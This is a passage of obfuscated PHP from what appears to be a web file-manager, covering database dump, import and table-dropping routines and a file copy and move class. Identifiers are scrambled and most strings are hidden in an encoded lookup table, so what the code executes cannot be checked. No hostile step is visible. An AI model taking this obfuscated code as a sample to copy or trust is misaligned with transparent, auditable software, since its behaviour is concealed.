substr($¶Œ÷±Ó¨[$_SERVER[íïàËŸë][87]], strlen("\x7b\151\157\72{$¶Œ÷±Ó¨[$_SERVER[íïàËŸë][900]]}\x7d")); $¶Œ÷±Ó¨[$_SERVER[íïàËŸë][900]] = $ß§œçê¿; } $Ü§¢öüÙ[] = $_SERVER[íïàËŸë][1162] . $this->sqlEncode($¶Œ÷±Ó¨) . $_SERVER[íïàËŸë][1163]; } $Î±ğ¹§Š = "\111\116\123\105\x52\124\x20\x49\116\x54\x4f\x20\x60{$ª¾¨Ò´è}\x60\x20\50\x60" . implode($_SERVER[íïàËŸë][1164], $ˆĞÔ§æä) . $_SERVER[íïàËŸë][1165]; fwrite($ñÃ¥æ­†, $Î±ğ¹§Š . implode($_SERVER[íïàËŸë][1166], $Ü§¢öüÙ) . $_SERVER[íïàËŸë][74] . PHP_EOL); $ÆÀ«Œäœ += $ÖşÇ‹½‰; if ($ƒášš’) { $ƒášš’->update($ÖşÇ‹½‰); } } while ($Éñ“»È¨ == $ÖşÇ‹½‰); fclose($ñÃ¥æ­†); return $ÆÀ«Œäœ; } public function sqlToDb($Û¤àÄ¶, &$á×¨¼›Ÿ) { $»š¸óàê =& $_SERVER[íïàËŸë]; $õá„èã = $this->model()->db(); $¬”Ù€¶£ = @fopen($Û¤àÄ¶, $»š¸óàê[1167]); if (!$¬”Ù€¶£) { return !1; } $Û¢öªÑê = 0; $‡³ÓŒ±Œ = $»š¸óàê[12]; $Ã÷ ù = array(); $ÖÊë½à§ = $this->dbType(); $¬šÒø±“ = $ÖÊë½à§ == $»š¸óàê[13] ? 500 : 2000; $›ôËè¨¹ = basename($Û¤àÄ¶, $»š¸óàê[871]); $“¾×ªÈ = 0; $Ô“¸¨’ = 4194304; while (!feof($¬”Ù€¶£)) { $ÙàÔÅèÃ = trim(fgets($¬”Ù€¶£)); if (!$ÙàÔÅèÃ) { continue; } $ë„ ØúÑ = $this->sqlDecode($ÙàÔÅèÃ, $ÖÊë½à§, $›ôËè¨¹); if (stripos($ë„ ØúÑ, $»š¸óàê[431]) === 0) { if (!$‡³ÓŒ±Œ) { $‡³ÓŒ±Œ = $ë„ ØúÑ . $»š¸óàê[53]; } continue; } if ($á×¨¼›Ÿ) { $á×¨¼›Ÿ->task[$»š¸óàê[1152]] += 1; } $Û¢öªÑê++; $Ã÷ ù[] = rtrim(rtrim(trim($ë„ ØúÑ), $»š¸óàê[50]), $»š¸óàê[74]); $øÊÇ»ğÏ = null; $Åıı£¥Ş = strlen($ë„ ØúÑ); $“¾×ªÈ += $Åıı£¥Ş; $æÅæ·ç« = strlen($‡³ÓŒ±Œ) + $“¾×ªÈ + (count($Ã÷ ù) - 1); if ($æÅæ·ç« >= $Ô“¸¨’) { $øÊÇ»ğÏ = array_pop($Ã÷ ù); if ($Û¢öªÑê > 1) { $Û¢öªÑê--; } } if ($Û¢öªÑê >= $¬šÒø±“ || $øÊÇ»ğÏ) { $ë„ ØúÑ = $‡³ÓŒ±Œ . implode($»š¸óàê[50], $Ã÷ ù); if (!$õá„èã->execute($ë„ ØúÑ)) { return !1; } if ($á×¨¼›Ÿ) { $á×¨¼›Ÿ->update($Û¢öªÑê); } $Ã÷ ù = array(); $Û¢öªÑê = 0; $“¾×ªÈ = 0; if ($øÊÇ»ğÏ) { $Ã÷ ù = array($øÊÇ»ğÏ); $Û¢öªÑê = 1; $“¾×ªÈ = $Åıı£¥Ş; } } } fclose($¬”Ù€¶£); if (!empty($Ã÷ ù)) { $ë„ ØúÑ = $‡³ÓŒ±Œ . implode($»š¸óàê[50], $Ã÷ ù); if (!$õá„èã->execute($ë„ ØúÑ)) { return !1; } if ($á×¨¼›Ÿ) { $á×¨¼›Ÿ->update($Û¢öªÑê); } } return !0; } public function dropTable($øÊ±µ‡Î = null) { $ë¤ûÇœ± = $this->model()->db(); $Å¸±ß’è = $øÊ±µ‡Î ? array($øÊ±µ‡Î) : $ë¤ûÇœ±->getTables(); if (!$Å¸±ß’è) { return; } foreach ($Å¸±ß’è as $øÊ±µ‡Î) { if ($øÊ±µ‡Î) { $øÊ±µ‡Î = strtolower($øÊ±µ‡Î); } else { continue; } $ë¤ûÇœ±->execute("\x64\x72\157\160\x20\164\x61\x62\x6c\x65\40\151\x66\40\x65\x78\151\x73\164\x73\x20\140{$øÊ±µ‡Î}\x60"); } } private function sqlEncode($®à¨öÎİ) { $Â²×‚¯ø =& $_SERVER[íïàËŸë]; $İÂÚì­„ = array(); foreach ($®à¨öÎİ as $‚êå¡çÓ) { if (is_array($‚êå¡çÓ)) { $‚êå¡çÓ = json_encode_force($‚êå¡çÓ); } $‚êå¡çÓ = addslashes($‚êå¡çÓ); $‚êå¡çÓ = str_replace(array($Â²×‚¯ø[1168], $Â²×‚¯ø[262], $Â²×‚¯ø[418]), array($Â²×‚¯ø[1169], $Â²×‚¯ø[1170], $Â²×‚¯ø[1171]), $‚êå¡çÓ); $İÂÚì­„[] = $‚êå¡çÓ; } return $Â²×‚¯ø[58] . implode($Â²×‚¯ø[1172], $İÂÚì­„) . $Â²×‚¯ø[58]; } private function sqlDecode($ÀëÒ¬½¥, $ˆ¾ëÂÄï, $àó›Í›Ê = '') { $ÅÛ€îı» =& $_SERVER[íïàËŸë]; $ÀëÒ¬½¥ = str_replace(array($ÅÛ€îı»[1169], $ÅÛ€îı»[1170], $ÅÛ€îı»[1171]), array($ÅÛ€îı»[1168], $ÅÛ€îı»[262], $ÅÛ€îı»[418]), $ÀëÒ¬½¥); if ($ˆ¾ëÂÄï == $ÅÛ€îı»[13]) { $ÀëÒ¬½¥ = str_ireplace($ÅÛ€îı»[1173], $ÅÛ€îı»[59], $ÀëÒ¬½¥); $ÀëÒ¬½¥ = stripslashes($ÀëÒ¬½¥); } return preg_replace($ÅÛ€îı»[1174], $ÅÛ€îı»[12], $ÀëÒ¬½¥); if ($ˆ¾ëÂÄï == $ÅÛ€îı»[13]) { return $àó›Í›Ê != $ÅÛ€îı»[1175] ? stripslashes($ÀëÒ¬½¥) : $ÀëÒ¬½¥; } if ($àó›Í›Ê == $ÅÛ€îı»[1175]) { $ÀëÒ¬½¥ = str_replace($ÅÛ€îı»[1176], $ÅÛ€îı»[121], stripslashes($ÀëÒ¬½¥)); } return $ÀëÒ¬½¥; } public function getSqlFile($İ¥Õ×Å = '') { $»‘Î—ã¯ =& $_SERVER[íïàËŸë]; $î™«‘˜ø = $this->dbType(!0); $ï•Ì‰æ = CONTROLLER_DIR . "\x69\x6e\163\x74\x61\154\x6c\57\x64\141\x74\141\57{$î™«‘˜ø}\56\163\161\x6c"; $£üÍŞµ™ = file_get_contents($ï•Ì‰æ); $ÑçƒÒÙü = $»‘Î—ã¯[1177] . ($î™«‘˜ø == $»‘Î—ã¯[887] ? $»‘Î—ã¯[1178] : $»‘Î—ã¯[1179]) . $»‘Î—ã¯[1180]; preg_match_all($ÑçƒÒÙü, $£üÍŞµ™, $ÏŠÇ§ş×); $ ÅÔíÊ— = $ÏŠÇ§ş×[1]; $Û„˜ÏÆ = $this->model()->db(); $´¬ò—÷ = $Û„˜ÏÆ->getTables(); $ŒÔè©­ë = TEMP_FILES . $»‘Î—ã¯[1181] . date($»‘Î—ã¯[272]) . $»‘Î—ã¯[8]; del_dir($ŒÔè©­ë); mk_dir($ŒÔè©­ë); $É¶ãÌàĞ = $ŒÔè©­ë . $»‘Î—ã¯[1182]; $—ëÃ¤İÕ = $ŒÔè©­ë . $»‘Î—ã¯[1183]; $Éå…öéÂ = $î™«‘˜ø == $»‘Î—ã¯[13] ? $»‘Î—ã¯[887] : $»‘Î—ã¯[13]; IO::copy(CONTROLLER_DIR . "\x69\156\163\164\x61\x6c\154\x2f\144\x61\x74\x61\57{$Éå…öéÂ}\56\x73\161\154", $ŒÔè©­ë); @touch($ŒÔè©­ë . $î™«‘˜ø . $»‘Î—ã¯[871]); $äôû¡è = fopen($É¶ãÌàĞ, $»‘Î—ã¯[1156]); $ê³ı•àç = fopen($—ëÃ¤İÕ, $»‘Î—ã¯[1156]); if ($î™«‘˜ø == $»‘Î—ã¯[13]) { $´¬ò—÷ = array_diff($´¬ò—÷, array($»‘Î—ã¯[863], $»‘Î—ã¯[864])); $£ıã£Œ¾ = array($»‘Î—ã¯[1184], $»‘Î—ã¯[1185], $»‘Î—ã¯[1186]); fwrite($ê³ı•àç, implode(PHP_EOL, $£ıã£Œ¾) . PHP_EOL . PHP_EOL); foreach ($´¬ò—÷ as $„Æ²Ë¬) { $õøÇšè¦ = $this->sqlFromSqlite($„Æ²Ë¬); if (!$õøÇšè¦[$»‘Î—ã¯[13]]) { continue; } fwrite($ê³ı•àç, $õøÇšè¦[$»‘Î—ã¯[13]] . PHP_EOL . PHP_EOL); if (!in_array($„Æ²Ë¬, $ ÅÔíÊ—)) { fwrite($äôû¡è, $õøÇšè¦[$»‘Î—ã¯[887]] . PHP_EOL . PHP_EOL); } } } else { foreach ($´¬ò—÷ as $„Æ²Ë¬) { $õøÇšè¦ = $this->sqlFromMysql($„Æ²Ë¬); if (!$õøÇšè¦[$»‘Î—ã¯[887]]) { continue; } fwrite($äôû¡è, $õøÇšè¦[$»‘Î—ã¯[887]] . PHP_EOL . PHP_EOL); if (!in_array($„Æ²Ë¬, $ ÅÔíÊ—)) { fwrite($ê³ı•àç, $õøÇšè¦[$»‘Î—ã¯[13]] . PHP_EOL . PHP_EOL); } } } fclose($äôû¡è); fclose($ê³ı•àç); $£üÍŞµ™ = array($»‘Î—ã¯[887] => $É¶ãÌàĞ, $»‘Î—ã¯[13] => $—ëÃ¤İÕ); return $İ¥Õ×Å ? $£üÍŞµ™[$İ¥Õ×Å] : $£üÍŞµ™; } public function dbType($ÀóÁ·Æï = false) { $ÎË‘‘º =& $_SERVER[íïàËŸë]; $îøˆÏ¦á = $ÀóÁ·Æï ? $GLOBALS[$ÎË‘‘º[6]][$ÎË‘‘º[21]] : $this->database; $îøˆÏ¦á = array_change_key_case($îøˆÏ¦á); $‚‹æ³öß = $îøˆÏ¦á[$ÎË‘‘º[1056]]; if ($‚‹æ³öß == $ÎË‘‘º[1053]) { $ªö‡˜Ğ‘ = explode($ÎË‘‘º[4], $îøˆÏ¦á[$ÎË‘‘º[1062]]); $‚‹æ³öß = $ªö‡˜Ğ‘[0]; } $¶ßÁ“îİ = array($ÎË‘‘º[1187] => $ÎË‘‘º[13], $ÎË‘‘º[1001] => $ÎË‘‘º[887]); if (isset($¶ßÁ“îİ[$‚‹æ³öß])) { $‚‹æ³öß = $¶ßÁ“îİ[$‚‹æ³öß]; } return $‚‹æ³öß; } public function sqlFromMysql($ã‘§üèÙ, $§İÒ¥Î¶ = '') { $‰øÜâ¤Ã =& $_SERVER[íïàËŸë]; $Èş±˜…… = $this->model()->db(); $ğ³ŠÍºæ = $Èş±˜……->query($‰øÜâ¤Ã[1188] . $ã‘§üèÙ . $‰øÜâ¤Ã[461]); if (!$ğ³ŠÍºæ || !$ğ³ŠÍºæ[0]) { return !1; } $Ë¢ã¯éº = _get($ğ³ŠÍºæ[0], $‰øÜâ¤Ã[1189], $‰øÜâ¤Ã[12]); if (!$Ë¢ã¯éº) { return !1; } $´—¼²Úç = "\104\122\x4f\x50\40\124\x41\x42\x4c\105\40\x49\x46\40\105\130\111\123\124\x53\40\x60{$ã‘§üèÙ}\x60\x3b" . PHP_EOL . $Ë¢ã¯éº . $‰øÜâ¤Ã[74]; if ($§İÒ¥Î¶ && $§İÒ¥Î¶ == $‰øÜâ¤Ã[887]) { return $´—¼²Úç; } $‹ù¿ñÊ = array_change_key_case($GLOBALS[$‰øÜâ¤Ã[6]][$‰øÜâ¤Ã[21]]); $ìŒËø„ = $‹ù¿ñÊ[$‰øÜâ¤Ã[1061]]; $ÒØì˜À÷ = $‰øÜâ¤Ã[1190] . $ìŒËø„ . $‰øÜâ¤Ã[1191] . $ã‘§üèÙ . $‰øÜâ¤Ã[58]; $åò¼¢Ã = $‰øÜâ¤Ã[1192] . $ã‘§üèÙ . $‰øÜâ¤Ã[989]; $ÎÕµóŒ = $Èş±˜……->query($ÒØì˜À÷); if (empty($ÎÕµóŒ)) { $‰’ óî¸ = array($‰øÜâ¤Ã[887] => $‰øÜâ¤Ã[12], $‰øÜâ¤Ã[13] => $‰øÜâ¤Ã[12]); return $§İÒ¥Î¶ ? $‰’ óî¸[$§İÒ¥Î¶] : $‰’ óî¸; } $µÌ²ÅŒÃ = $Èş±˜……->query($åò¼¢Ã); $ğ¢§Îè = $‰øÜâ¤Ã[12]; $â™¬¹æı = array(); foreach ($µÌ²ÅŒÃ as $²œ×ãƒå) { if (!$ğ¢§Îè && $²œ×ãƒå[$‰øÜâ¤Ã[1193]] == $‰øÜâ¤Ã[1194]) { $ğ¢§Îè = $²œ×ãƒå[$‰øÜâ¤Ã[1195]]; } if (isset($â™¬¹æı[$²œ×ãƒå[$‰øÜâ¤Ã[1193]]])) { $â™¬¹æı[$²œ×ãƒå[$‰øÜâ¤Ã[1193]]][$‰øÜâ¤Ã[1196]][] = $²œ×ãƒå[$‰øÜâ¤Ã[1195]]; continue; } $â™¬¹æı[$²œ×ãƒå[$‰øÜâ¤Ã[1193]]] = array($‰øÜâ¤Ã[1197] => $²œ×ãƒå[$‰øÜâ¤Ã[1193]], $‰øÜâ¤Ã[1196] => array($²œ×ãƒå[$‰øÜâ¤Ã[1195]]), $‰øÜâ¤Ã[1198] => $²œ×ãƒå[$‰øÜâ¤Ã[1199]] == $‰øÜâ¤Ã[91] ? 0 : 1); } $ç¡ååŠÑ = array(); foreach ($â™¬¹æı as $²œ×ãƒå) { $ôÅà×ëù = $²œ×ãƒå[$‰øÜâ¤Ã[1197]] == $‰øÜâ¤Ã[1194]; $¼íæì¿ï = array($‰øÜâ¤Ã[1200], $²œ×ãƒå[$‰øÜâ¤Ã[1198]] == $‰øÜâ¤Ã[91] && !$ôÅà×ëù ? $‰øÜâ¤Ã[1201] : $‰øÜâ¤Ã[12], $‰øÜâ¤Ã[1202], $‰øÜâ¤Ã[1203] . $ã‘§üèÙ . $‰øÜâ¤Ã[11] . ($ôÅà×ëù ? $‰øÜâ¤Ã[1204] : $²œ×ãƒå[$‰øÜâ¤Ã[1197]]) . $‰øÜâ¤Ã[121], $‰øÜâ¤Ã[1205], $‰øÜâ¤Ã[121] . $ã‘§üèÙ . $‰øÜâ¤Ã[121], $‰øÜâ¤Ã[1206] . implode($‰øÜâ¤Ã[1207], $²œ×ãƒå[$‰øÜâ¤Ã[1196]]) . $‰øÜâ¤Ã[1208]); $ç¡ååŠÑ[] = implode($‰øÜâ¤Ã[53], $¼íæì¿ï) . $‰øÜâ¤Ã[74]; } $ıàÈ÷¤à = array(); $ó™‡ıç÷ = array($‰øÜâ¤Ã[1209] => $‰øÜâ¤Ã[1210], $‰øÜâ¤Ã[1210] => $‰øÜâ¤Ã[1210], $‰øÜâ¤Ã[364] => $‰øÜâ¤Ã[391], $‰øÜâ¤Ã[363] => $‰øÜâ¤Ã[391]); foreach ($ÎÕµóŒ as $²œ×ãƒå) { $¼íæì¿ï = array($‰øÜâ¤Ã[121] . $²œ×ãƒå[$‰øÜâ¤Ã[1211]] . $‰øÜâ¤Ã[121], isset($ó™‡ıç÷[$²œ×ãƒå[$‰øÜâ¤Ã[1212]]]) ? $ó™‡ıç÷[$²œ×ãƒå[$‰øÜâ¤Ã[1212]]] : $²œ×ãƒå[$‰øÜâ¤Ã[1213]], $²œ×ãƒå[$‰øÜâ¤Ã[1214]] == $‰øÜâ¤Ã[987] ? $‰øÜâ¤Ã[1215] : $‰øÜâ¤Ã[1216], $²œ×ãƒå[$‰øÜâ¤Ã[1211]] == $ğ¢§Îè ? $‰øÜâ¤Ã[1217] : $‰øÜâ¤Ã[12], $²œ×ãƒå[$‰øÜâ¤Ã[1038]] ? strtoupper(str_replace($‰øÜâ¤Ã[11], $‰øÜâ¤Ã[12], $²œ×ãƒå[$‰øÜâ¤Ã[1038]])) : $‰øÜâ¤Ã[12]); $ıàÈ÷¤à[] = trim(implode($‰øÜâ¤Ã[53], $¼íæì¿ï)); } $ÚöÓ…¸Ù = array($‰øÜâ¤Ã[1218] . $ã‘§üèÙ . $‰øÜâ¤Ã[1219], $‰øÜâ¤Ã[1220] . $ã‘§üèÙ . $‰øÜâ¤Ã[1221], implode($‰øÜâ¤Ã[50] . PHP_EOL, $ıàÈ÷¤à), $‰øÜâ¤Ã[1035]); $ş¸òüºÄ = implode(PHP_EOL, array_merge($ÚöÓ…¸Ù, $ç¡ååŠÑ)); if ($§İÒ¥Î¶ && $§İÒ¥Î¶ == $‰øÜâ¤Ã[13]) { return $ş¸òüºÄ; } $‰’ óî¸ = array($‰øÜâ¤Ã[887] => $´—¼²Úç, $‰øÜâ¤Ã[13] => $ş¸òüºÄ); return $§İÒ¥Î¶ ? $‰’ óî¸[$§İÒ¥Î¶] : $‰’ óî¸; } public function sqlFromSqlite($£€üË§§, $ŞÃ©…›‹ = '') { $§”½«º™ =& $_SERVER[íïàËŸë]; $À¹ı”… = $this->model()->db(); $¿È±›Ğˆ = "\120\122\101\107\x4d\x41\x20\x54\x41\102\x4c\x45\137\x49\x4e\106\117\x20\x28\47{$£€üË§§}\x27\51"; $‡üşæŠÅ = "\123\x45\114\x45\x43\124\40\x2a\40\x46\122\117\x4d\x20\163\161\x6c\x69\x74\x65\x5f\x6d\x61\x73\x74\x65\162\x20\127\x48\x45\x52\105\40\164\142\x6c\x5f\x6e\x61\155\145\40\75\x20\47{$£€üË§§}\x27"; $Òàû¦€½ = $À¹ı”…->query($¿È±›Ğˆ); if (empty($Òàû¦€½)) { $©É²Ä = array($§”½«º™[887] => $§”½«º™[12], $§”½«º™[13] => $§”½«º™[12]); return $ŞÃ©…›‹ ? $©É²Ä[$ŞÃ©…›‹] : $©É²Ä; } $¨ŒìÕĞÉ = $À¹ı”…->query($‡üşæŠÅ); $ò«Ú„‹” = $ ı“ÖÍ  = array(); foreach ($¨ŒìÕĞÉ as $¹Ê›ªÍÓ) { if ($¹Ê›ªÍÓ[$§”½«º™[33]] == $§”½«º™[356]) { $ò«Ú„‹”[] = $¹Ê›ªÍÓ[$§”½«º™[1222]]; } else { $ ı“ÖÍ [$¹Ê›ªÍÓ[$§”½«º™[32]]] = $¹Ê›ªÍÓ[$§”½«º™[1222]]; } } $ÕÑŸöª› = array_merge(array($§”½«º™[1218] . $£€üË§§ . $§”½«º™[121]), $ò«Ú„‹”, array_values($ ı“ÖÍ )); $ÕÑŸöª› = implode($§”½«º™[74] . PHP_EOL, $ÕÑŸöª›) . $§”½«º™[74]; if ($ŞÃ©…›‹ && $ŞÃ©…›‹ == $§”½«º™[13]) { return $ÕÑŸöª›; } $µğû¥ßò = array(); $™«œÏ†Û = array($§”½«º™[1210] => $§”½«º™[1223], $§”½«º™[391] => $§”½«º™[1224]); $»£¸öî = $§”½«º™[12]; foreach ($Òàû¦€½ as $¹Ê›ªÍÓ) { if ($¹Ê›ªÍÓ[$§”½«º™[57]] == $§”½«º™[91]) { $»£¸öî = $¹Ê›ªÍÓ[$§”½«º™[32]]; } $¡ÕğƒİÕ = array($§”½«º™[461] . $¹Ê›ªÍÓ[$§”½«º™[32]] . $§”½«º™[461], isset($™«œÏ†Û[$¹Ê›ªÍÓ[$§”½«º™[33]]]) ? $™«œÏ†Û[$¹Ê›ªÍÓ[$§”½«º™[33]]] : $¹Ê›ªÍÓ[$§”½«º™[33]], $¹Ê›ªÍÓ[$§”½«º™[35]] == $§”½«º™[91] ? $§”½«º™[1215] : $§”½«º™[1225] . $¹Ê›ªÍÓ[$§”½«º™[56]], $¹Ê›ªÍÓ[$§”½«º™[57]] == $§”½«º™[91] ? $§”½«º™[1226] : $§”½«º™[12]); $µğû¥ßò[] = trim(implode($§”½«º™[53], $¡ÕğƒİÕ)); } foreach ($ ı“ÖÍ  as $ú€¬ËÄ‰ => $¿Ûº¾¯¼) { $»µº£ì± = str_replace($§”½«º™[1227] . $£€üË§§ . $§”½«º™[11], $§”½«º™[12], $ú€¬ËÄ‰); $ÓìëĞêŒ = str_replace(array($§”½«º™[121], $§”½«º™[1046]), $§”½«º™[461], substr($¿Ûº¾¯¼, stripos($¿Ûº¾¯¼, $§”½«º™[337]))); if ($»µº£ì± == $§”½«º™[1204]) { $ñ§‰Ÿ‡é = $§”½«º™[1228] . $»£¸öî . $§”½«º™[1229]; } else { $ñ§‰Ÿ‡é = (stripos($»µº£ì±, $§”½«º™[11]) ? $§”½«º™[1230] : $§”½«º™[12]) . ($§”½«º™[1231] . $»µº£ì± . $§”½«º™[1232] . $ÓìëĞêŒ); } $µğû¥ßò[] = $ñ§‰Ÿ‡é; } $ÅÍÊÚ¶ = array($§”½«º™[1233] . $£€üË§§ . $§”½«º™[1234], $§”½«º™[1235] . $£€üË§§ . $§”½«º™[1236], implode($§”½«º™[50] . PHP_EOL, $µğû¥ßò), $§”½«º™[1237]); $øŞÆ­¬ø = implode(PHP_EOL, $ÅÍÊÚ¶); if ($ŞÃ©…›‹ && $ŞÃ©…›‹ == $§”½«º™[887]) { return $øŞÆ­¬ø; } $©É²Ä = array($§”½«º™[887] => $øŞÆ­¬ø, $§”½«º™[13] => $ÕÑŸöª›); return $ŞÃ©…›‹ ? $©É²Ä[$ŞÃ©…›‹] : $©É²Ä; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($áşÆøö, $ÑœĞÒñš) { $İ«©¿Âá =& $_SERVER[íïàËŸë]; $®Éüû‰ = $ÑœĞÒñš; $GLOBALS[$İ«©¿Âá[1238]] = $İ«©¿Âá[1239] . $áşÆøö; Hook::trigger($İ«©¿Âá[1239] . $áşÆøö . $İ«©¿Âá[1240], $®Éüû‰); $«ãêÄ¼† = self::driverMake($ÑœĞÒñš[0]); if (!$«ãêÄ¼†) { return !1; } if (method_exists($«ãêÄ¼†, $áşÆøö)) { $ÏÖ»ò = @call_user_func_array(array($«ãêÄ¼†, $áşÆøö), $ÑœĞÒñš); } else { if (method_exists($«ãêÄ¼†, $İ«©¿Âá[1241])) { $ÏÖ»ò = @call_user_func_array(array($«ãêÄ¼†, $áşÆøö), $ÑœĞÒñš); } else { if (method_exists(self, $áşÆøö)) { $ÏÖ»ò = @call_user_func_array(array(self, $áşÆøö), $ÑœĞÒñš); } else { $ÏÖ»ò = call_user_func_array(array(parent, $áşÆøö), $ÑœĞÒñš); } } } Hook::trigger($İ«©¿Âá[1239] . $áşÆøö . $İ«©¿Âá[1242], $®Éüû‰, $ÏÖ»ò); return $ÏÖ»ò; } public static function init($èÀÎÑë•) { return self::driverMake($èÀÎÑë•); } public static function copy($úãŠÄÈ¯, $ØæàÌ‰ñ, $Ô‘«Ëã = false, $±µÇû×š = false) { return self::copyMoveStart($úãŠÄÈ¯, $ØæàÌ‰ñ, $Ô‘«Ëã, $_SERVER[íïàËŸë][618], $±µÇû×š); } public static function move($ÆØŞñŸ‰, $¬ü¡Ì’ø, $‹‚úÊİã = false, $‹çî¿È = false) { return self::copyMoveStart($ÆØŞñŸ‰, $¬ü¡Ì’ø, $‹‚úÊİã, $_SERVER[íïàËŸë][620], $‹çî¿È); } private static function copyMoveStart($¯–«ª—µ, $¬èÙ”ğî, $ö©ûş´è, $ãˆ¥ª„, $’ÏÓÌöœ) { $´æ¤¸Ö =& $_SERVER[íïàËŸë]; $ŠÉ¸üïğ = array($¯–«ª—µ, $¬èÙ”ğî, $ö©ûş´è, $’ÏÓÌöœ); Hook::trigger($´æ¤¸Ö[1239] . $ãˆ¥ª„ . $´æ¤¸Ö[1240], $ŠÉ¸üïğ); $–í×÷ìà = self::copyMove($¯–«ª—µ, $¬èÙ”ğî, $ö©ûş´è, $ãˆ¥ª„, $’ÏÓÌöœ); Hook::trigger($´æ¤¸Ö[1239] . $ãˆ¥ª„ . $´æ¤¸Ö[1242], $ŠÉ¸üïğ, $–í×÷ìà); return $–í×÷ìà; } public static function saveFile($œ°¬£Ùá, $©áÔõŠ›, $˜Î²ö = true) { $ŸÙ‹ÑÙ =& $_SERVER[íïàËŸë]; $ùÜ¾âÔ = self::info($©áÔõŠ›); $ñĞ‰êÔå = self::driverMake($œ°¬£Ùá); $©ôçÊ×  = self::driverMake($©áÔõŠ›); $ÂüŠÓå = !1; if ($©ôçÊ× ->pathParse[$ŸÙ‹ÑÙ[1243]]) { $ÂüŠÓå = $©ôçÊ× ; $ñ§‹§ù = $©ôçÊ× ->pathParse[$ŸÙ‹ÑÙ[1243]]; $©ôçÊ×  = self::driverMake($ñ§‹§ù); } if ($ñĞ‰êÔå->pathParse[$ŸÙ‹ÑÙ[1243]]) { $Ò—ÇÅ¢µ = $ñĞ‰êÔå->pathParse[$ŸÙ‹ÑÙ[1243]]; $ñĞ‰êÔå = self::driverMake($Ò—ÇÅ¢µ); } $É’ŠíÑ© = $©ôçÊ× ->pathFather($©áÔõŠ›); $Ìù¶¥¬ = !0; if (!$˜Î²ö && self::driverIsSame($ñĞ‰êÔå, $©ôçÊ× )) { $Ìù¶¥¬ = !1; } $¯Øôşó« = self::copyFile($ñĞ‰êÔå, $œ°¬£Ùá, $©ôçÊ× , $É’ŠíÑ©, $ùÜ¾âÔ[$ŸÙ‹ÑÙ[32]], $Ìù¶¥¬); if ($ÂüŠÓå) { $¯Øôşó« = $ÂüŠÓå->getPathOuter($¯Øôşó«); } return $¯Øôşó«; } private static function copyMove($åÏ˜Ùä, $Ê¬™¸¿Ä, $İŞ÷œÍ®, $Ï¹Á¨É½, $®°ãâ©Ê = false) { $ÇŠœÀ¨§ =& $_SERVER[íïàËŸë]; if (!$åÏ˜Ùä || $åÏ˜Ùä == $ÇŠœÀ¨§[8] || !$Ê¬™¸¿Ä) { return !1; } ignore_timeout(); $•Âüì…Š = self::driverMake($åÏ˜Ùä); $Ú›‚ƒ¨ï = self::driverMake($Ê¬™¸¿Ä); $·İ¹½Ãı = $Ï¹Á¨É½ == $ÇŠœÀ¨§[620]; $ÅÕó€™è = !1; if ($Ú›‚ƒ¨ï->pathParse[$ÇŠœÀ¨§[1243]]) { $ÅÕó€™è = $Ú›‚ƒ¨ï; $Ê¬™¸¿Ä = $Ú›‚ƒ¨ï->pathParse[$ÇŠœÀ¨§[1243]]; $Ú›‚ƒ¨ï = self::driverMake($Ê¬™¸¿Ä); } if ($•Âüì…Š->pathParse[$ÇŠœÀ¨§[1243]]) { $åÏ˜Ùä = $•Âüì…Š->pathParse[$ÇŠœÀ¨§[1243]]; $•Âüì…Š = self::driverMake($åÏ˜Ùä); } self::check($•Âüì…Š, $åÏ˜Ùä, $Ú›‚ƒ¨ï, $Ê¬™¸¿Ä); Hook::trigger($ÇŠœÀ¨§[1244], $•Âüì…Š, $åÏ˜Ùä, $Ú›‚ƒ¨ï, $Ê¬™¸¿Ä); $ÑÖ‡Š†÷ = self::driverIsSame($•Âüì…Š, $Ú›‚ƒ¨ï); if ($ÑÖ‡Š†÷) { if ($Ï¹Á¨É½ == $ÇŠœÀ¨§[620] && !method_exists($Ú›‚ƒ¨ï, $ÇŠœÀ¨§[1245]) && trim($Ê¬™¸¿Ä, $ÇŠœÀ¨§[8]) == trim($Ú›‚ƒ¨ï->pathFather($åÏ˜Ùä), $ÇŠœÀ¨§[8])) { if ($•Âüì…Š->pathThis($åÏ˜Ùä) != $®°ãâ©Ê && !$•Âüì…Š->isOsDriver()) { return $•Âüì…Š->rename($åÏ˜Ùä, $®°ãâ©Ê); } return $Ú›‚ƒ¨ï->getPathOuter($åÏ˜Ùä); } if (method_exists($Ú›‚ƒ¨ï, $Ï¹Á¨É½)) { return $Ú›‚ƒ¨ï->{$Ï¹Á¨É½}($åÏ˜Ùä, $Ê¬™¸¿Ä, $İŞ÷œÍ®, $®°ãâ©Ê); } } if ($ÑÖ‡Š†÷ && $Ï¹Á¨É½ == $ÇŠœÀ¨§[620] && $Ú›‚ƒ¨ï->getType() == $ÇŠœÀ¨§[109]) { $èú²ÉÉù = $Ú›‚ƒ¨ï->movePath($åÏ˜Ùä, $Ê¬™¸¿Ä, $®°ãâ©Ê); if ($èú²ÉÉù) { return $èú²ÉÉù; } } $‚·ºæåÚ = $•Âüì…Š->isFile($åÏ˜Ùä); if (!$‚·ºæåÚ && $Ú›‚ƒ¨ï->getType() == $ÇŠœÀ¨§[840] && $•Âüì…Š->getType() == $ÇŠœÀ¨§[109]) { $èú²ÉÉù = $Ú›‚ƒ¨ï->copyFolderFromIO($•Âüì…Š, $åÏ˜Ùä, $Ê¬™¸¿Ä, $İŞ÷œÍ®, $·İ¹½Ãı, $®°ãâ©Ê); } else { $èú²ÉÉù = self::copyPath($•Âüì…Š, $åÏ˜Ùä, $Ú›‚ƒ¨ï, $Ê¬™¸¿Ä, $İŞ÷œÍ®, $·İ¹½Ãı, $‚·ºæåÚ, $®°ãâ©Ê); } if ($èú²ÉÉù && $·İ¹½Ãı) { $•Âüì…Š->remove($åÏ˜Ùä); } if ($ÅÕó€™è) { $èú²ÉÉù = $ÅÕó€™è->getPathOuter($èú²ÉÉù); } return $èú²ÉÉù; } private static function check($êø¶©»¯, $Øã÷“ÖØ, $ï™¥ùÇú, &$ù ï–Šş) { $‰×€€ëú =& $_SERVER[íïàËŸë]; if (self::driverIsSame($êø¶©»¯, $ï™¥ùÇú) && $êø¶©»¯->isFolder($Øã÷“ÖØ) && $êø¶©»¯->isParentOf($Øã÷“ÖØ, $ù ï–Šş)) { show_json(LNG($‰×€€ëú[1246]), !1); } if (!$êø¶©»¯->exist($Øã÷“ÖØ)) { show_json(LNG($‰×€€ëú[108]), !1); } } private static function copyPath($ª—ë™çÇ, $‚‰•×âÆ, $ü÷£·, $Ì¿İÃ¸¾, $¶»Š˜•Í, $óà——¬, $Àçàóù², 